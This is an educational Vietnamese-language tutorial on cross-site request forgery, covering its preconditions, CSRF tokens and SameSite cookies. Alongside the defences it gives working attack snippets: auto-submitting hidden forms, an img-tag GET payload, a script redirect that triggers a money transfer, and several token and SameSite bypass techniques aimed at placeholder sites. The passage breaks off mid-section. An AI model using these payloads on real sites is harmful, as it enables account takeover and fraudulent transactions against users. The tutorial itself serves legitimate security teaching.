```table-of-contents
```

# CSRF là gì?

Giả mạo yêu cầu liên trang (còn được gọi là CSRF) là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến người dùng thực hiện các hành động mà họ không hề có ý định thực hiện. Lỗ hổng này cho phép kẻ tấn công phần nào lách qua **chính sách cùng nguồn gốc** (same origin policy), vốn được thiết kế để ngăn các website khác nhau can thiệp lẫn nhau.
![](../../image/Pasted%20image%2020260504185725.png)
# Hậu quả

Trong một cuộc tấn công CSRF thành công, kẻ tấn công khiến người dùng nạn nhân thực hiện một hành động ngoài ý muốn. Ví dụ, điều này có thể là thay đổi địa chỉ email trên tài khoản của họ, đổi mật khẩu, hoặc thực hiện một giao dịch chuyển tiền. Tùy thuộc vào bản chất của hành động, kẻ tấn công có thể giành quyền kiểm soát hoàn toàn tài khoản của người dùng. Nếu người dùng bị xâm phạm có vai trò đặc quyền trong ứng dụng, thì kẻ tấn công thậm chí có thể kiểm soát hoàn toàn tất cả dữ liệu và chức năng của ứng dụng.

# Cách CSRF hoạt động

Để một cuộc tấn công CSRF có thể xảy ra, cần hội đủ ba điều kiện chính:
1. **Một hành động liên quan**
    Ứng dụng phải có một hành động mà kẻ tấn công có lý do để dụ nạn nhân thực hiện. Hành động này có thể là hành động đặc quyền (như chỉnh sửa quyền của người dùng khác) hoặc hành động liên quan đến dữ liệu cá nhân của người dùng (như thay đổi mật khẩu của chính họ).
2. **Xử lý phiên dựa trên cookie**
    Việc thực hiện hành động bao gồm việc gửi một hoặc nhiều yêu cầu HTTP, và ứng dụng chỉ dựa vào session-cookie để xác định người dùng nào đã gửi các yêu cầu đó. Không có cơ chế bổ sung nào khác để theo dõi session hoặc xác thực yêu cầu của người dùng.
3. **Không có tham số yêu cầu khó đoán**
    Các yêu cầu để thực hiện hành động không chứa tham số nào có giá trị mà kẻ tấn công không thể biết hoặc đoán được. Ví dụ: khi buộc người dùng thay đổi mật khẩu, chức năng sẽ không bị khai thác nếu kẻ tấn công cần biết giá trị mật khẩu hiện tại.
    
Ví dụ, giả sử một ứng dụng có chức năng cho phép người dùng thay đổi địa chỉ email trong tài khoản của họ. Khi người dùng thực hiện hành động này, họ gửi một yêu cầu HTTP như sau:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

Yêu cầu này thỏa mãn các điều kiện cần thiết cho một cuộc tấn công CSRF:

1. **Hành động thay đổi email** trong tài khoản người dùng là điều mà kẻ tấn công quan tâm. Sau khi thay đổi email, kẻ tấn công thường có thể kích hoạt chức năng đặt lại mật khẩu và chiếm quyền kiểm soát toàn bộ tài khoản của nạn nhân.
2. **Ứng dụng sử dụng cookie phiên** để xác định người dùng nào đã gửi yêu cầu. Không có cơ chế bổ sung nào khác (như token xác thực) để theo dõi phiên hoặc xác thực yêu cầu.
3. **Kẻ tấn công dễ dàng xác định giá trị các tham số trong yêu cầu** cần thiết để thực hiện hành động. Ví dụ, chỉ cần đặt giá trị email mới là đủ, không cần thông tin khó đoán khác.

Với các điều kiện trên, kẻ tấn công có thể tạo một trang web chứa đoạn HTML như sau:

```html
<html>
    <body>
        <form action="<https://vulnerable-website.com/email/change>" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Trong kịch bản này:

- Người dùng khi đang đăng nhập trên **[vulnerable-website.com](http://vulnerable-website.com)** (cookie phiên hợp lệ vẫn còn) và truy cập vào trang web do kẻ tấn công kiểm soát sẽ vô tình gửi yêu cầu thay đổi email.
- Biểu mẫu ẩn (`hidden input`) tự động được submit bằng JavaScript.
- Kết quả là địa chỉ email của nạn nhân bị thay đổi thành **[pwned@evil-user.net](mailto:pwned@evil-user.net)**, cho phép kẻ tấn công chiếm quyền kiểm soát tài khoản.

Nếu nạn nhân truy cập vào trang web của kẻ tấn công, các bước sau sẽ xảy ra:

1. Trang của kẻ tấn công sẽ kích hoạt một **yêu cầu HTTP** đến website dễ bị tấn công.
2. Nếu người dùng đang đăng nhập trên website đó, trình duyệt của họ sẽ **tự động gửi kèm cookie phiên** trong yêu cầu (giả sử cookie không được cấu hình với thuộc tính `SameSite`).
3. Website dễ bị tấn công sẽ xử lý yêu cầu như bình thường, coi nó được thực hiện bởi chính người dùng nạn nhân, và thay đổi địa chỉ email trong tài khoản của họ.

> Lứu ý Mặc dù CSRF thường được mô tả trong bối cảnh xử lý phiên dựa trên cookie, nhưng nó cũng có thể xảy ra trong những trường hợp khác, nơi ứng dụng tự động thêm thông tin xác thực của người dùng vào yêu cầu, chẳng hạn như:
> 
> - **Xác thực HTTP Basic**
> - **Xác thực dựa trên chứng chỉ (certificate-based authentication)**
# Cách xây dựng cuộc tấn công CSRF

Việc tự tay tạo HTML cho một khai thác CSRF có thể khá rườm rà, đặc biệt khi yêu cầu cần thực hiện chứa nhiều tham số hoặc có những đặc điểm bất thường. Cách đơn giản nhất để xây dựng một khai thác CSRF là sử dụng **CSRF PoC generator** tích hợp sẵn trong **Burp Suite Professional**:

1. Chọn một request bất kỳ trong Burp Suite Professional mà bạn muốn kiểm thử hoặc khai thác.
2. Từ menu chuột phải, chọn **Engagement tools / Generate CSRF PoC**.
3. Burp Suite sẽ tạo ra một đoạn HTML có khả năng kích hoạt request đã chọn (trừ cookie – cookie sẽ tự động được thêm bởi trình duyệt của nạn nhân).
4. Bạn có thể tinh chỉnh nhiều tùy chọn trong CSRF PoC generator để điều chỉnh chi tiết của cuộc tấn công. Trong một số trường hợp đặc biệt, điều này cần thiết để xử lý các đặc thù bất thường của request.
5. Sao chép đoạn HTML đã sinh vào một trang web, mở nó bằng một trình duyệt đang đăng nhập vào website dễ bị tấn công, và kiểm tra xem request mong muốn có được gửi thành công và hành động có diễn ra như dự định hay không.

# Cách vận hành cuộc tấn công CSRF


Cơ chế truyền tải của các cuộc tấn công **giả mạo yêu cầu liên trang (CSRF)** về cơ bản giống với **reflected XSS**. Thông thường, kẻ tấn công sẽ đặt đoạn HTML độc hại lên một website do chúng kiểm soát, sau đó dụ nạn nhân truy cập vào website này. Việc này có thể thực hiện bằng cách gửi liên kết đến người dùng qua email hoặc tin nhắn trên mạng xã hội. Nếu đoạn tấn công được chèn vào một website phổ biến (ví dụ trong phần bình luận người dùng), kẻ tấn công có thể chỉ cần chờ nạn nhân truy cập.

🔹 **Lưu ý:** Một số khai thác CSRF đơn giản sử dụng phương thức **GET** và có thể được gói gọn trong một URL duy nhất trên website dễ bị tấn công. Trong tình huống này, kẻ tấn công thậm chí không cần một website ngoài, mà có thể trực tiếp gửi cho nạn nhân một URL độc hại thuộc domain dễ bị tấn công.

Ví dụ, nếu yêu cầu đổi email có thể thực hiện bằng phương thức GET, thì một cuộc tấn công tự chứa sẽ trông như sau:

```html
<img src="<https://vulnerable-website.com/email/change?email=pwned@evil-user.net>">
```

Trong trường hợp này, chỉ cần người dùng mở trang chứa đoạn `<img>` này, trình duyệt sẽ tự động gửi request thay đổi email mà không cần bất kỳ thao tác nào khác.

# Phòng tránh CSRF

Ngày nay, để tìm và khai thác thành công lỗ hổng CSRF thường đòi hỏi phải vượt qua các biện pháp phòng chống được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai. Các cơ chế phòng thủ phổ biến nhất mà bạn sẽ gặp bao gồm:

1. **CSRF tokens**
    - CSRF token là một giá trị **duy nhất, bí mật và khó đoán**, được sinh ra bởi ứng dụng phía server và gửi kèm cho client.
    - Khi thực hiện một hành động nhạy cảm (ví dụ: submit form), client bắt buộc phải gửi kèm CSRF token chính xác trong request.
    - Điều này khiến kẻ tấn công rất khó có thể tạo ra một request hợp lệ thay mặt cho nạn nhân.
2. **SameSite cookies**
    - SameSite là một cơ chế bảo mật của trình duyệt xác định khi nào cookie của một website được gửi kèm trong các request xuất phát từ domain khác.
    - Vì các hành động nhạy cảm thường yêu cầu cookie phiên xác thực, nên việc áp dụng hạn chế SameSite phù hợp có thể ngăn kẻ tấn công kích hoạt các hành động này từ cross-site.
    - Từ năm 2021, Chrome mặc định áp dụng **SameSite=Lax**, và do đây là chuẩn được đề xuất, nhiều trình duyệt lớn khác cũng sẽ áp dụng hành vi này trong tương lai.
3. **Xác thực dựa trên Referer**
    - Một số ứng dụng dựa vào HTTP header **Referer** để kiểm tra và xác minh rằng request bắt nguồn từ domain của chính ứng dụng.
    - Tuy nhiên, cách này thường kém hiệu quả hơn so với việc sử dụng CSRF token, vì header Referer có thể bị ẩn hoặc bỏ qua trong một số tình huống.

# CSRF token
## Khái niệm


**CSRF token** là một giá trị **duy nhất, bí mật và khó đoán** được sinh ra bởi ứng dụng phía server và chia sẻ cho client. Khi gửi một request để thực hiện hành động nhạy cảm (ví dụ: submit form), client bắt buộc phải kèm đúng CSRF token. Nếu không, server sẽ từ chối xử lý hành động được yêu cầu.

Một cách phổ biến để chia sẻ CSRF token với client là đưa nó vào như một tham số ẩn trong form HTML. Ví dụ:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

Trong ví dụ này, khi người dùng gửi form thay đổi email, request sẽ bao gồm CSRF token. Server sẽ kiểm tra token này trước khi thực hiện hành động để đảm bảo rằng request thực sự xuất phát từ phiên người dùng hợp lệ, không phải từ một nguồn tấn công CSRF.

Khi submit form trên, request được gửi đi sẽ như sau:

```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

Nếu được triển khai đúng cách, **CSRF token** sẽ giúp bảo vệ chống lại các cuộc tấn công CSRF bằng cách khiến kẻ tấn công khó tạo ra một request hợp lệ thay mặt cho nạn nhân. Do kẻ tấn công **không thể dự đoán giá trị chính xác của CSRF token**, chúng sẽ không thể đưa token này vào request độc hại.

> **Lưu ý**
> 
> - CSRF token **không nhất thiết** phải được gửi dưới dạng tham số ẩn trong request POST.
> - Một số ứng dụng triển khai CSRF token trong **HTTP header**, chẳng hạn.
> - **Cách truyền token** có ảnh hưởng lớn đến mức độ an toàn của cơ chế bảo vệ tổng thể.

## Khai thác


Các lỗ hổng CSRF thường xuất hiện do việc **xác thực CSRF token bị triển khai sai hoặc chưa đầy đủ**. Trong phần này, chúng ta sẽ tìm hiểu một số vấn đề thường gặp nhất khiến kẻ tấn công có thể **bypass (vượt qua)** cơ chế phòng thủ này.

### Request

Một số ứng dụng chỉ xác thực CSRF token đúng cách khi request sử dụng phương thức **POST**, nhưng lại bỏ qua việc xác thực khi sử dụng **GET**.

Trong tình huống này, kẻ tấn công có thể **chuyển sang dùng phương thức GET** để bypass việc xác thực và thực hiện tấn công CSRF, ví dụ:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

👉 Do ứng dụng không kiểm tra CSRF token trong request GET, hành động thay đổi email vẫn được xử lý, từ đó tạo điều kiện cho kẻ tấn công chiếm quyền tài khoản của nạn nhân.

### Token

Một số ứng dụng chỉ xác thực CSRF token khi nó **có mặt trong request**, nhưng lại **bỏ qua hoàn toàn việc xác thực** nếu tham số token bị thiếu.

Trong tình huống này, kẻ tấn công có thể **xóa toàn bộ tham số chứa token** (không chỉ xóa giá trị) để bypass xác thực và thực hiện tấn công CSRF, ví dụ:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

👉 Vì ứng dụng không xử lý việc thiếu token, request vẫn được chấp nhận, cho phép kẻ tấn công thay đổi email và chiếm quyền kiểm soát tài khoản của nạn nhân.
### User session

Một số ứng dụng không kiểm tra xem CSRF token có thuộc cùng phiên (**session**) với người dùng đang gửi request hay không. Thay vào đó, ứng dụng chỉ duy trì một **pool (tập hợp) token toàn cục** mà nó đã phát sinh và chấp nhận bất kỳ token nào có trong pool này.

Trong tình huống này:

- Kẻ tấn công có thể đăng nhập bằng **tài khoản của chính mình**,
- Lấy một **CSRF token hợp lệ**,
- Sau đó chèn token này vào request gửi cho nạn nhân trong cuộc tấn công CSRF.

👉 Vì ứng dụng không ràng buộc token với phiên người dùng cụ thể, request độc hại vẫn được chấp nhận, dẫn đến việc kẻ tấn công có thể thực hiện hành động thay mặt nạn nhân.

### Non-session cookie

Một biến thể của lỗ hổng trước là khi ứng dụng có ràng buộc CSRF token với một **cookie**, nhưng cookie đó **không phải** là cookie được dùng để quản lý phiên (**session cookie**).

Điều này thường xảy ra khi ứng dụng sử dụng **hai framework khác nhau**:
- Một framework để xử lý phiên (session handling).
- Một framework khác để bảo vệ CSRF.
    → Và hai cơ chế này **không được tích hợp chặt chẽ** với nhau.
Ví dụ:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

👉 Trong trường hợp này, token **csrf** chỉ được ràng buộc với cookie **csrfKey**, chứ không liên quan gì đến cookie **session**. Điều này cho phép kẻ tấn công thao túng token–cookie cặp đôi này để thực hiện CSRF attack mà không bị ràng buộc với phiên thực tế của nạn nhân.
Tình huống này tuy khó khai thác hơn nhưng vẫn tồn tại lỗ hổng. Nếu website có bất kỳ hành vi nào cho phép kẻ tấn công **đặt cookie vào trình duyệt của nạn nhân**, thì cuộc tấn công là khả thi.

Kịch bản khai thác:

1. Kẻ tấn công đăng nhập vào ứng dụng bằng tài khoản của chính mình.
2. Lấy một **token hợp lệ** cùng với **cookie đi kèm**.
3. Lợi dụng hành vi cho phép đặt cookie để chèn cookie của chúng vào trình duyệt của nạn nhân.
4. Gửi token của chúng cho nạn nhân trong một cuộc tấn công CSRF.

> **Lưu ý**
> 
> - Hành vi đặt cookie không nhất thiết phải tồn tại trong **cùng một ứng dụng web** chứa lỗ hổng CSRF.
> - Bất kỳ ứng dụng nào khác trong cùng **một miền DNS tổng thể** đều có thể bị lợi dụng để đặt cookie trong ứng dụng mục tiêu, nếu cookie đó có phạm vi (**scope**) phù hợp.

Ví dụ:

- Một chức năng đặt cookie tại `staging.demo.normal-website.com` có thể bị lợi dụng để chèn cookie vào `secure.normal-website.com`.
- Khi đó, cookie giả mạo sẽ được gửi kèm trong request tới ứng dụng dễ bị tấn công, cho phép thực hiện CSRF attack thành công.

### Duplicate CSFR token in cookie

Một biến thể khác của lỗ hổng trước là khi ứng dụng **không lưu trữ token nào phía server**, mà chỉ **nhân bản token** trong cả cookie và tham số của request.

Khi request được gửi, ứng dụng chỉ đơn giản kiểm tra xem **giá trị token trong tham số request** có trùng với **giá trị token trong cookie** hay không.

Cách làm này thường được gọi là cơ chế phòng thủ **"double submit"** chống CSRF. Nó được một số nơi khuyến nghị vì dễ triển khai và không cần quản lý trạng thái (state) trên server.

Ví dụ:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com

```

**Khả năng khai thác**

Trong trường hợp này, kẻ tấn công **vẫn có thể thực hiện CSRF attack** nếu website có bất kỳ chức năng nào cho phép **đặt cookie trong trình duyệt nạn nhân**.

- Kẻ tấn công **không cần token hợp lệ** của riêng mình.
- Chúng có thể tự tạo ra một token (chỉ cần theo đúng định dạng nếu ứng dụng có kiểm tra).
- Sau đó, lợi dụng hành vi đặt cookie để chèn cookie giả vào trình duyệt nạn nhân.
- Cuối cùng, gửi request chứa token tự chế khớp với cookie đã chèn, qua đó bypass được kiểm tra và thực hiện tấn công CSRF thành công.

# **SameSite cookies**

## Khái niệm SameSite

**SameSite** là một cơ chế bảo mật của trình duyệt, quy định khi nào cookie của một website sẽ được gửi kèm trong các request có nguồn gốc từ domain khác. Các hạn chế của SameSite giúp bảo vệ một phần chống lại nhiều kiểu tấn công cross-site, bao gồm:

- **CSRF (Cross-Site Request Forgery)**
- **Cross-site leaks (XS-Leaks)**
- Một số khai thác **CORS**

Từ năm 2021, Chrome mặc định áp dụng hạn chế **SameSite=Lax** nếu website phát hành cookie không chỉ định mức hạn chế riêng. Đây là chuẩn được đề xuất, và nhiều trình duyệt lớn khác dự kiến cũng sẽ áp dụng hành vi này trong tương lai.

👉 Vì vậy, việc nắm vững cách thức hoạt động của cơ chế SameSite, cũng như các phương pháp có thể **bypass hạn chế này**, là rất quan trọng để kiểm thử triệt để các vector tấn công cross-site.

**Nội dung phần này**

1. Giải thích cách cơ chế **SameSite** hoạt động và làm rõ một số thuật ngữ liên quan.
2. Trình bày các kỹ thuật phổ biến giúp **bypass SameSite restrictions**, từ đó cho phép thực hiện CSRF và các tấn công cross-site khác trên những website ban đầu có vẻ an toàn.
## Khái niệm SameSite cookie

Trong bối cảnh hạn chế của **SameSite cookie**, một **site** được định nghĩa là:

- **Tên miền cấp cao nhất (TLD)**, thường là `.com`, `.net`, `.org`, v.v.
- **Cộng thêm một cấp tên miền nữa**.

👉 Cách gọi này thường được biết đến với tên **TLD+1**.

Ví dụ:

- `app.example.com` và `mail.example.com` đều thuộc cùng một **site**: `example.com`
- Nhưng `example.com` và `example.co.uk` cần xem xét **eTLD+1** để tính đúng site là `example.co.uk`.

> **Lưu ý về scheme (giao thức)**
> 
> Khi xác định một request có phải là **same-site** hay không, **scheme của URL** cũng được xét đến.
> 
> - Nghĩa là: `http://app.example.com` → `https://app.example.com` sẽ bị hầu hết các trình duyệt coi là **cross-site**.

![](../../image/Pasted%20image%2020260505015407.png)
> 🔹 Ghi chú
> 
> Bạn có thể bắt gặp thuật ngữ **effective top-level domain (eTLD)**. Đây là cách xử lý dành cho các hậu tố nhiều phần được coi là TLD trong thực tế, ví dụ: `.co.uk`.
> 
> - Như vậy, với domain `shop.example.co.uk`, **site** trong bối cảnh SameSite sẽ là `example.co.uk`.
## Site v/s Origin

Điểm khác biệt chính giữa **site** và **origin** là **phạm vi**:

- **Site** bao gồm nhiều tên miền con (subdomain).
- **Origin** chỉ bao gồm **một domain duy nhất**, được xác định chặt chẽ hơn.

👉 Mặc dù hai khái niệm này có liên quan mật thiết, nhưng **không được dùng thay thế cho nhau**, vì việc nhầm lẫn có thể dẫn đến hậu quả nghiêm trọng về bảo mật.

Hai URL có cùng **origin** nếu **cùng chính xác**:

- Scheme (giao thức: `http`, `https`, …)
- Tên miền (domain name)
- Cổng (port) _(lưu ý: port thường được suy ra từ scheme, ví dụ `https` → 443)_

So sánh

|Request từ|Request tới|Same-site?|Same-origin?|
|---|---|---|---|
|`https://example.com`|`https://example.com`|✅ Có|✅ Có|
|`https://app.example.com`|`https://intranet.example.com`|✅ Có|❌ Không (domain khác nhau)|
|`https://example.com`|`https://example.com:8080`|✅ Có|❌ Không (port khác nhau)|
|`https://example.com`|`https://example.co.uk`|❌ Không (eTLD khác nhau)|❌ Không (domain khác nhau)|
|`https://example.com`|`http://example.com`|❌ Không (scheme khác nhau)|❌ Không (scheme khác nhau)|

- **Site** ít ràng buộc hơn (chỉ xét scheme + phần cuối domain).
- Một request **cross-origin** vẫn có thể là **same-site**, nhưng **cross-site** thì chắc chắn không thể là same-origin.

👉 Điều này đặc biệt quan trọng: bất kỳ lỗ hổng nào cho phép thực thi JavaScript tùy ý có thể bị lợi dụng để **bypass cơ chế phòng thủ dựa trên site** tại các domain khác thuộc cùng một site.

## Cách SameSite hoạt động


Trước khi cơ chế **SameSite** ra đời, trình duyệt sẽ luôn gửi cookie trong mọi request đến domain đã phát hành cookie đó, ngay cả khi request được kích hoạt bởi một website bên thứ ba không liên quan.

**SameSite** cho phép trình duyệt và website quyết định xem request **cross-site** nào (nếu có) sẽ được gửi kèm cookie. Điều này giúp giảm thiểu nguy cơ người dùng bị tấn công **CSRF**, vốn dựa trên việc ép trình duyệt nạn nhân gửi request chứa hành động nguy hiểm đến website dễ bị tấn công.

- Vì những request này thường yêu cầu cookie phiên xác thực của nạn nhân, nên tấn công sẽ thất bại nếu trình duyệt không gửi cookie đó đi.

Các mức hạn chế:

- **Stric**
- **Lax**
- **None**

Các **developer** có thể thủ công cấu hình mức hạn chế cho từng cookie mà họ tạo, nhờ đó kiểm soát rõ ràng hơn việc cookie sẽ được gửi trong tình huống nào.

Để làm điều này, chỉ cần thêm thuộc tính **SameSite** vào header **Set-Cookie** trong phản hồi HTTP, kèm theo giá trị mong muốn:

```
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

Cơ chế này mang lại một lớp bảo vệ chống lại tấn công **CSRF**, nhưng ⚠️ **không mức hạn chế nào đảm bảo miễn dịch tuyệt đối**. Các ví dụ và bài lab thực hành sẽ chứng minh rằng vẫn có cách để bypass các hạn chế này.

> **🔹 Lưu ý**
> 
> - Nếu website phát hành cookie **không thiết lập rõ** thuộc tính `SameSite`, thì **Chrome sẽ tự động áp dụng mặc định `SameSite=Lax`**.
> - Nghĩa là cookie chỉ được gửi trong những request cross-site thỏa mãn điều kiện cụ thể, mặc dù developer không hề cấu hình hành vi này.
> - Đây là **chuẩn mới được đề xuất**, và nhiều trình duyệt lớn khác dự kiến cũng sẽ áp dụng trong tương lai.

👉 Tóm lại: SameSite giúp hạn chế CSRF, nhưng để đảm bảo an toàn, vẫn cần kết hợp với các cơ chế khác như **CSRF token** và **kiểm tra server-side**.

### Strict


Nếu một cookie được thiết lập với thuộc tính **SameSite=Strict**, trình duyệt sẽ không gửi nó trong bất kỳ yêu cầu cross-site nào. Nói một cách đơn giản, điều này có nghĩa là nếu trang đích của yêu cầu không khớp với trang web hiện đang hiển thị trên thanh địa chỉ của trình duyệt, cookie sẽ không được gửi kèm.

Điều này được khuyến nghị khi thiết lập cookie cho phép người dùng sửa đổi dữ liệu hoặc thực hiện các hành động nhạy cảm khác, chẳng hạn như truy cập các trang cụ thể chỉ khả dụng cho người dùng đã xác thực.

Mặc dù đây là tùy chọn an toàn nhất, nó có thể ảnh hưởng tiêu cực đến trải nghiệm người dùng trong các trường hợp mà chức năng cross-site là mong muốn.
### Lax

Hạn chế **SameSite=Lax** có nghĩa là trình duyệt sẽ gửi cookie trong các yêu cầu cross-site, nhưng chỉ khi cả hai điều kiện sau được đáp ứng:

- Yêu cầu sử dụng phương thức **GET**.
- Yêu cầu xuất phát từ một điều hướng cấp cao (top-level navigation) của người dùng, chẳng hạn như nhấp vào một liên kết.

Điều này có nghĩa là cookie sẽ không được gửi trong các yêu cầu **POST cross-site**, chẳng hạn. Vì yêu cầu POST thường được sử dụng để thực hiện các hành động thay đổi dữ liệu hoặc trạng thái (ít nhất là theo thông lệ tốt), nên chúng có khả năng cao trở thành mục tiêu của các cuộc tấn công CSRF.

Tương tự, cookie cũng không được gửi trong các yêu cầu nền (background requests), chẳng hạn như những yêu cầu được khởi tạo bởi script, iframe, hoặc tham chiếu đến hình ảnh và tài nguyên khác.
### None

Nếu một cookie được thiết lập với thuộc tính **SameSite=None**, điều này thực tế sẽ vô hiệu hóa hoàn toàn các hạn chế SameSite, bất kể trình duyệt nào. Do đó, trình duyệt sẽ gửi cookie này trong mọi yêu cầu đến trang web đã phát hành nó, ngay cả những yêu cầu được kích hoạt bởi các trang web bên thứ ba hoàn toàn không liên quan.

Ngoại trừ Chrome, đây là hành vi mặc định của các trình duyệt lớn nếu không có thuộc tính SameSite được cung cấp khi thiết lập cookie.

Có những lý do hợp lệ để vô hiệu hóa SameSite, chẳng hạn khi cookie được dùng trong ngữ cảnh bên thứ ba và không trao cho người dùng quyền truy cập vào bất kỳ dữ liệu hoặc chức năng nhạy cảm nào. Cookie theo dõi (tracking cookies) là một ví dụ điển hình.

Nếu bạn gặp một cookie được thiết lập với **SameSite=None** hoặc không có bất kỳ hạn chế rõ ràng nào, thì đáng để kiểm tra xem nó có được sử dụng vào mục đích gì hay không. Khi Chrome lần đầu áp dụng hành vi **"Lax-by-default"**, điều này đã vô tình làm hỏng rất nhiều chức năng web hiện có. Như một cách khắc phục nhanh, một số website đã chọn cách **vô hiệu hóa hạn chế SameSite trên tất cả cookie**, bao gồm cả những cookie có thể chứa dữ liệu nhạy cảm.

Khi thiết lập cookie với **SameSite=None**, website cũng bắt buộc phải kèm theo thuộc tính **Secure**, nhằm đảm bảo cookie chỉ được gửi trong các thông điệp mã hóa qua HTTPS. Nếu không có thuộc tính này, trình duyệt sẽ từ chối cookie và nó sẽ không được thiết lập.

Ví dụ:

```
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
```

## Khai thác

### Lax: GET Request


Trên thực tế, máy chủ không phải lúc nào cũng khắt khe về việc chúng nhận yêu cầu **GET** hay **POST** đến một endpoint nhất định, kể cả những endpoint dự kiến nhận dữ liệu từ form. Nếu chúng cũng sử dụng hạn chế **Lax** cho cookie phiên, dù được cấu hình tường minh hay do mặc định của trình duyệt, bạn vẫn có thể thực hiện một cuộc tấn công CSRF bằng cách kích hoạt một yêu cầu **GET** từ trình duyệt của nạn nhân.

Miễn là yêu cầu liên quan đến điều hướng cấp cao (top-level navigation), trình duyệt vẫn sẽ gửi kèm cookie phiên của nạn nhân. Dưới đây là một trong những cách đơn giản nhất để khởi phát kiểu tấn công này:

```html
<script>
    document.location = '<https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000>';
</script>
```

Ngay cả khi một yêu cầu GET thông thường không được cho phép, một số framework cung cấp cách ghi đè phương thức được chỉ định trong dòng request. Ví dụ, Symfony hỗ trợ tham số `_method` trong form, tham số này có ưu tiên cao hơn phương thức thông thường cho mục đích routing:

```html
<form action="<https://vulnerable-website.com/account/transfer-payment>" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Các framework khác cũng hỗ trợ nhiều tham số tương tự.

### On-site gadgets


Nếu một cookie được thiết lập với thuộc tính **SameSite=Strict**, trình duyệt sẽ không đưa nó vào bất kỳ yêu cầu cross-site nào. Bạn có thể vượt qua giới hạn này nếu tìm được một **gadget** dẫn đến việc phát sinh một yêu cầu thứ cấp trong cùng **site**.

Một gadget khả dĩ là **chuyển hướng phía client** (client-side redirect) xây dựng động đích chuyển hướng bằng input có thể kiểm soát bởi kẻ tấn công như tham số URL.

Theo cách trình duyệt xử lý, các chuyển hướng phía client (client-side redirects) **không thực sự được coi là chuyển hướng**; yêu cầu phát sinh chỉ được xem như một request độc lập, bình thường. Quan trọng nhất, đây được coi là một **yêu cầu same-site**, vì vậy nó sẽ bao gồm tất cả cookie liên quan đến site, bất kể có hạn chế SameSite nào được áp dụng.

Nếu bạn có thể lợi dụng gadget này để tạo ra một yêu cầu phụ độc hại, điều đó có thể cho phép bạn **hoàn toàn bypass các hạn chế SameSite cookie**.

🔹 **Lưu ý**: Tấn công tương tự **không khả thi** với **chuyển hướng phía server (server-side redirects)**. Trong trường hợp này, trình duyệt nhận biết rằng việc theo chuyển hướng bắt nguồn từ một yêu cầu cross-site ban đầu, nên chúng vẫn áp dụng các hạn chế cookie tương ứng.

### Sibling domain

Dù bạn đang kiểm thử website của người khác hay bảo mật cho chính website của mình, cần lưu ý rằng một request vẫn có thể được coi là **same-site** ngay cả khi nó được gửi **cross-origin**.

Do đó, hãy chắc chắn rằng bạn kiểm tra kỹ toàn bộ bề mặt tấn công, bao gồm cả các **sibling domain** (các domain cùng thuộc một site). Đặc biệt, những lỗ hổng cho phép bạn tạo ra một request phụ tùy ý, chẳng hạn như **XSS**, có thể khiến mọi cơ chế phòng thủ dựa trên site bị vô hiệu hóa hoàn toàn, làm lộ toàn bộ domain trong site cho các cuộc tấn công cross-site.

Ngoài CSRF truyền thống, đừng quên rằng nếu website mục tiêu hỗ trợ **WebSockets**, chức năng này có thể dễ bị tấn công **Cross-Site WebSocket Hijacking (CSWSH)**. Đây về cơ bản cũng là một dạng tấn công CSRF, nhưng nhắm vào quá trình **bắt tay (handshake) của WebSocket**.

### **Newly issued cookies**


Thông thường, cookie với hạn chế **SameSite=Lax** sẽ **không được gửi trong các request POST cross-site**. Tuy nhiên, có một số ngoại lệ.

Như đã đề cập, nếu một website không đặt thuộc tính **SameSite** khi phát hành cookie, Chrome sẽ tự động áp dụng hạn chế **Lax** theo mặc định. Nhưng để tránh làm hỏng các cơ chế **SSO (Single Sign-On)**, Chrome **không thực thi hạn chế này trong 120 giây đầu tiên** đối với các request POST cấp cao (top-level POST). Do đó, sẽ tồn tại một **khoảng thời gian 2 phút** trong đó người dùng có thể bị tấn công cross-site.

> 🔹 **Lưu ý:** Khoảng thời gian 2 phút này **không áp dụng** cho các cookie được cấu hình rõ ràng với `SameSite=Lax`.

- Việc căn thời điểm tấn công chính xác trong khoảng 2 phút này thường **khó khả thi**.
- Tuy nhiên, nếu bạn tìm thấy một **gadget** trên site cho phép buộc nạn nhân được phát hành **một cookie phiên mới**, bạn có thể **chủ động làm mới cookie** của họ trước khi thực hiện tấn công chính.

Ví dụ:

